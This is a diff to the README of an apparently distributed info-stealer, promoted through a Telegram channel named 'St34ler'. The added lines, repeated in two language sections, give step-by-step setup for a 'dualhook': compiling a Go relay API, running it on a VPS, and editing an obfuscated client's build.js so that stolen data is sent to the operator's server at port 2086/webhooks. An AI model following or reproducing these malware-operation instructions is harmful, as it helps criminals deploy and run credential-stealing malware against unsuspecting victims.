@@ -44,7 +44,19 @@ verified roles: "customers roles"
 /build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot
 
 
-Ne pas edit la config de build.js sinon plus rien ne marchera
+HOW TO SETUP YOUR OWN DUALHOOK:
+Drop Api folder on your computer put your webhook on main.go
+make cmd on your folder and do that
+set GOOS=linux
+go build -ldflags "-s -w" main.go
+after put the file builded on your vps in Api Folder and do:
+chmod 777 main
+screen -dmS Api ./main
+
+after go in the folder Clientobf and edit the build.js and replace 172.232.56.12 by your vps id dont delete that: "http://" and that ":2086/webhooks/"
+
+
+
 
 official 1336 Channel
 https://t.me/St34ler
@@ -94,7 +106,19 @@ verified roles: "customers roles"
 /build icon: none (icon not work or crash bot) webhook_url: your webhook name: yourname with no space or crash bot
 
 
-don't edit build.js or nothing will be work
+HOW TO SETUP YOUR OWN DUALHOOK:
+Drop Api folder on your computer put your webhook on main.go
+make cmd on your folder and do that
+set GOOS=linux
+go build -ldflags "-s -w" main.go
+after put the file builded on your vps in Api Folder and do:
+chmod 777 main
+screen -dmS Api ./main
+
+after go in the folder Clientobf and edit the build.js and replace 172.232.56.12 by your vps id dont delete that: "http://" and that ":2086/webhooks/"
+
+
+
 
 official 1336 Channel
 https://t.me/St34ler
